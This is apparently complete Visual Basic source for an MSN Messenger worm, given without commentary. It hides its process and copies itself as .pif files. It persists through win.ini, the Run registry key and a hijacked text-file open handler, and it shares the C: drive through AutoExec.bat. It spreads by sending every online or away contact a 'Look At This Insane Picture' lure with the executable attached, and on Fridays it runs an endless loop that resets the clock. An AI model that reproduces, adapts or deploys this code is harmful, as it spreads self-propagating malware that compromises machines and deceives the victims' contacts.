Option Explicit
   Public WithEvents Msn As MessengerAPI.Messenger
Private Sub Form_Load()
On Error Resume Next
App.TaskVisible = False
Set Msn = New MessengerAPI.Messenger
On Error Resume Next
FileCopy App.Path + "/" + App.EXEName & ".exe", Environ("windir") & "\Perl" & ".pif"
On Error Resume Next
FileCopy App.Path + "/" + App.EXEName & ".exe", "c:\Look At This!" & ".pif"
On Error Resume Next
Open "C:\windows\win.ini" For Append As #1
Print #1, "[Windows]"
Print #1, "load=C:\windows\perl.pif"
Print #1, "run=perl.pif"
Close #1
Open "c:\AutoExec.bat" For Append As #1
Print #1, "Net Share WinNt=C:\"
Close #1
Shell "c:\AutoExec.bat", vbHide
List
Spread
DoEvents
If Day(Now) = vbFriday Then
Open "C:\windows\wtc.BAT" For Append As #1
Print #1, ":Time"
Print #1, "Time 4:20"
Print #1, "goto Time"
Shell "C:\windows\WTC.BAT"
End If
End Sub

Function Spread()
Dim msncontacts As IMessengerContacts
Dim msncontact As IMessengerContact
Set msncontacts = Msn.MyContacts
For Each msncontact In msncontacts
Dim newreg
Dim i
If msncontact.Status = MISTATUS_AWAY Then
Msn.InstantMessage msncontact
SendKeys "Look At This Insane Picture"
SendKeys "{enter}"
DoEvents
Msn.SendFile msncontact, "c:\Look At This!.pif"
SendKeys "{enter}"
DoEvents
End If
DoEvents
If msncontact.Status = MISTATUS_ONLINE Then
Msn.InstantMessage msncontact
SendKeys "Look At This Awesome Picture!"
SendKeys "{enter}"
DoEvents
Msn.SendFile msncontact, "c:\Look At This!.pif"
SendKeys "{enter}"
DoEvents
End If
Next
DoEvents
Set newreg = CreateObject("WScript.Shell")
newreg.regwrite "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\" & App.EXEName, App.Path & "\" & "Perl.exe"
newreg.regwrite "HKCR\txtfile\shell\open\command\", "Perl.pif %1"
End Function
